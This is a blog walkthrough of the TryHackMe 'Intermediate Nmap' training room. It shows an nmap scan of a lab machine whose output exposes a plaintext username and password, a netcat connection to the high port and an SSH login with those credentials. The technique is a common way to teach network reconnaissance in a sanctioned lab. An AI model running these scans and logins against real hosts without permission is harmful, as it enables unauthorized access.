---
title: Try Hack Me Intermediate Nmap
date: 2022-09-23T15:28:41+05:30
lastmod: 2022-09-23T15:28:41+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/IntermediateNmap.png
  alt: "cover image"
simg: /img/IntermediateNmap.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - Intermediate Nmap



draft: false
description: Try Hack Me Room Intermediate Nmap solved by Animesh Roy. this is a walkthrough. read more...

---

# OverView


| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|[Intermediate Nmap](https://tryhackme.com/room/intermediatenmap) {FREE ROOM}|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/01aff3c76024f34b0582ad59e2138bfd.png)|



## Task 01: 

You've learned some great nmap skills! Now can you combine that with other skills with netcat and protocols, to log in to this machine and find the flag? This VM MACHINE_IP is listening on a high port, and if you connect to it it may give you some information you can use to connect to a lower port commonly used for remote access!

## Recon

### Nmap

```bash

sudo nmap -sC -sV -oA nmap/inital 10.10.79.244       
Password:
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-23 15:33 IST
Nmap scan report for 10.10.79.244
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7d:dc:eb:90:e4:af:33:d9:9f:0b:21:9a:fc:d5:77:f2 (RSA)
|   256 83:a7:4a:61:ef:93:a3:57:1a:57:38:5c:48:2a:eb:16 (ECDSA)
|_  256 30:bf:ef:94:08:86:07:00:f7:fc:df:e8:ed:fe:07:af (ED25519)
2222/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ed:27:cb:99:fd:42:d2:7b:a5:9d:cf:bf:a0:f4:b9:f3 (RSA)
|   256 84:40:4f:e8:44:7a:f6:6a:01:49:bf:e1:17:9c:46:83 (ECDSA)
|_  256 27:5e:d6:3e:e6:56:bc:36:5d:7e:b6:de:d4:88:ff:e1 (ED25519)
31337/tcp open  Elite?
| fingerprint-strings: 
|   NULL: 
|     In case I forget - user:pass
|_    ubuntu:Dafdas!!/str0ng
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=9/23%Time=632D846C%P=x86_64-apple-darwin17.7
SF:.0%r(NULL,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafda
SF:s!!/str0ng\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds
```

---

### netcat on high port: 

```
nc 10.10.79.244 31337             
In case I forget - user:pass
ubuntu:{Password Here}
```

### SSH

use the found creds to login is user `ubuntu`

## Flag

>  flag is on `/home/user` dir

---